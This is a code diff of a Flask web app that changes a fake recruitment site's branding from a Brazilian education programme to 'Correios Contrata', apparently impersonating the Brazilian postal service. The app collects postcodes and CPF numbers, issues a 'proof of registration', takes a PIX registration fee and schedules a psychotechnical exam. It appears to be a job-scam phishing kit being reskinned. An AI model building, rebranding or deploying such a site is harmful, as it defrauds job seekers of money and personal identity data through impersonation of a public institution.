@@ -182,15 +182,15 @@ def busca():
 
 @app.route('/cadastro')
 def cadastro():
-    """Registration page for PNAE program"""
-    return render_template('cadastro.html', page_title="Cadastro - Mais Agentes da Educação")
+    """Registration page for Correios program"""
+    return render_template('cadastro.html', page_title="Cadastro - Correios Contrata")
 
 @app.route('/resultados-busca')
 def resultados_busca():
     """Results page showing available positions in the region"""
     cep = request.args.get('cep', '').strip()
     if not cep:
-        return render_template('cadastro.html', page_title="Cadastro - Mais Agentes da Educação")
+        return render_template('cadastro.html', page_title="Cadastro - Correios Contrata")
     
     # Validar e buscar dados do CEP via ViaCEP
     try:
@@ -202,7 +202,7 @@ def resultados_busca():
         if 'erro' in dados_cep:
             # CEP inválido
             return render_template('cadastro.html', 
-                                 page_title="Cadastro - Mais Agentes da Educação",
+                                 page_title="Cadastro - Correios Contrata",
                                  error="CEP não encontrado. Verifique e tente novamente.")
         
         localidade = dados_cep.get('localidade', 'Não informado')
@@ -224,7 +224,7 @@ def resultados_busca():
         codigo_regiao = f"REG-{cep[:2]}-{cep[2:5]}" if len(cep) >= 5 else "REG-00-000"
     
     return render_template('resultados_busca.html', 
-                         page_title="Resultados da Busca - Mais Agentes da Educação",
+                         page_title="Resultados da Busca - Correios Contrata",
                          cep=cep,
                          localidade=localidade,
                          estado=estado,
@@ -235,7 +235,7 @@ def resultados_busca():
 
 @app.route('/buscar-escolas')
 def buscar_escolas():
-    """Search for schools near a given CEP"""
+    """Search for Correios agencies near a given CEP"""
     cep = request.args.get('cep', '').strip()
     if not cep:
         return jsonify({'error': 'CEP é obrigatório'}), 400
@@ -243,20 +243,20 @@ def buscar_escolas():
     # For now, return mock data - we'll need Google Places API key for real data
     escolas = [
         {
-            'nome': 'Escola Municipal João Silva',
+            'nome': 'Agência Central dos Correios',
             'endereco': 'Rua das Flores, 123 - Centro',
             'distancia': '0.5 km',
             'telefone': '(11) 3456-7890'
         },
         {
-            'nome': 'Escola Municipal Maria Santos',
+            'nome': 'Agência dos Correios Vila Nova',
             'endereco': 'Av. Principal, 456 - Bairro Novo', 
             'distancia': '1.2 km',
             'telefone': '(11) 3456-7891'
         },
         {
-            'nome': 'Escola Municipal Pedro Oliveira',
-            'endereco': 'Rua da Educação, 789 - Vila Esperança',
+            'nome': 'Centro de Distribuição Correios',
+            'endereco': 'Rua da Logística, 789 - Vila Esperança',
             'distancia': '2.1 km', 
             'telefone': '(11) 3456-7892'
         }
@@ -267,7 +267,7 @@ def buscar_escolas():
 @app.route('/formulario-inscricao')
 def formulario_inscricao():
     """Registration form page - CPF step"""
-    return render_template('formulario_inscricao.html', page_title="Formulário de Inscrição - Mais Agentes da Educação")
+    return render_template('formulario_inscricao.html', page_title="Formulário de Inscrição - Correios Contrata")
 
 @app.route('/validar-cpf', methods=['POST'])
 def validar_cpf():
@@ -392,12 +392,12 @@ def validar_cpf():
 @app.route('/comprovante-inscricao')
 def comprovante_inscricao():
     """Proof of registration page"""
-    return render_template('comprovante_inscricao.html', page_title="Comprovante de Inscrição - Mais Agentes da Educação")
+    return render_template('comprovante_inscricao.html', page_title="Comprovante de Inscrição - Correios Contrata")
 
 @app.route('/pagamento-pix')
 def pagamento_pix():
     """PIX payment page"""
-    return render_template('pagamento_pix.html', page_title="Pagamento PIX - Mais Agentes da Educação")
+    return render_template('pagamento_pix.html', page_title="Pagamento PIX - Correios Contrata")
 
 @app.route('/api/gerar-pix', methods=['POST'])
 def gerar_pix():
@@ -435,7 +435,7 @@ def gerar_pix():
             cpf=cpf,
             phone=dados.get('telefone'),
             amount=int(valor * 100),  # Converter para centavos
-            description=dados.get('descricao', 'Taxa de Inscrição - Mais Agentes da Educação')
+            description=dados.get('descricao', 'Taxa de Inscrição - Correios Contrata')
         )
         
         # Criar pagamento PIX usando a classe correta
@@ -482,7 +482,7 @@ def verificar_pagamento(transacao_id):
 @app.route('/pagamento-confirmado')
 def pagamento_confirmado():
     """Payment confirmation page"""
-    return render_template('pagamento_confirmado.html', page_title="Pagamento Confirmado - Mais Agentes da Educação")
+    return render_template('pagamento_confirmado.html', page_title="Pagamento Confirmado - Correios Contrata")
 
 @app.route('/teste-pix')
 def teste_pix():
@@ -533,18 +533,18 @@ def teste_pix():
 
 @app.route('/registro-sgte')
 def registro_sgte():
-    """SGTE Registration page"""
-    return render_template('registro_sgte.html', page_title="SGTE - Sistema de Gestão do Trabalho e da Educação")
+    """SGTC Registration page"""
+    return render_template('registro_sgte.html', page_title="SGTC - Sistema de Gestão do Trabalho dos Correios")
 
 @app.route('/agendamento-psicotecnico')
 def agendamento_psicotecnico():
     """Psychotechnical exam scheduling page"""
-    return render_template('agendamento_psicotecnico.html', page_title="Agendamento Psicotécnico - Mais Agentes da Educação")
+    return render_template('agendamento_psicotecnico.html', page_title="Agendamento Psicotécnico - Correios Contrata")
 
 @app.route('/confirmacao-agendamento')
 def confirmacao_agendamento():
     """Confirmation page after scheduling data confirmation"""
-    return render_template('confirmacao_agendamento.html', page_title="Confirmação de Agendamento - Mais Agentes da Educação")
+    return render_template('confirmacao_agendamento.html', page_title="Confirmação de Agendamento - Correios Contrata")
 
 @app.route('/login')
 def login():
